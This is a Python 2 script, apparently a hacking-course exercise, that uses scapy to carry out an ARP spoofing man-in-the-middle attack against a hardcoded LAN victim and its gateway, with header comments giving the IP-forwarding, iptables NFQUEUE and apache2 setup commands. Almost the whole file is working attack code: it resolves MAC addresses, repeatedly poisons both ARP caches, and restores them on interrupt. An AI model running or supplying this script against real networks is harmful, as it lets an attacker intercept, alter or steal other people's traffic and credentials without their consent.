#python 2
# To make your pc a router you need to give the command on terminal
#echo 1 > /proc/sys/net/ipv4/ip_forward
#command before running this program, "iptables -I OUTPUT -j NFQUEUE --queue-num 0"
#command before running this program, "iptables -I INPUT -j NFQUEUE --queue-num 0"
# service apache2 start
import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    #this mac is for broadcast
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
# this line will return 2 lists, answered and unanswered.Timeout will specify time to request
    while True:
        answered_list = scapy.srp(arp_request_broadcast,timeout=2,verbose=False)[0]#verbose=False for no output on console
        mac = answered_list[0][1].hwsrc

        if mac:
            return mac
        #sender Ip address and Mac address which broadcast the broadcast
    # print(answered_list[0][0].pdst)
    # print(answered_list[0][0].hwdst)
# IP & MAC who replied for the packet
#     print(answered_list[0][1].psrc)
#     print(answered_list[0][1].hwsrc)


def target_spoof():
    #op=1 for sending op=2 for receiveing
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    # print(packet.summary())
    # print(packet.show())
    scapy.send(packet,verbose=False)


def geteway_spoof():

    #op=1 for sending op=2 for receiveing
    packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    # print(packet.summary())
    # print(packet.show())
    scapy.send(packet,verbose=False)


def target_restore(target_ip,gateway_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst = target_mac, psrc=gateway_ip,hwsrc=gateway_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


def gateway_restore(gateway_ip,target_ip):
    packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst = gateway_mac, psrc=target_ip,hwsrc=target_mac)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)



# get_mac("192.168.0.1/24")
target_ip = "192.168.0.105"
target_mac = get_mac(target_ip)
gateway_ip = "192.168.0.1"
gateway_mac = get_mac(gateway_ip)
send_packets_count = 0
try:
    send_packets_count = 0
    while True:
        # target_spoof(target_ip,gateway_ip)
        # geteway_spoof(gateway_ip,target_ip)
        target_spoof()
        geteway_spoof()
        send_packets_count = send_packets_count + 2
        # \r means always start from the start of the line
        print("\r[+] Packets sent "+str(send_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRK+C............Resetting ARP tables..... please wait.\n")
    target_restore(target_ip,gateway_ip)
    gateway_restore(gateway_ip, target_ip)
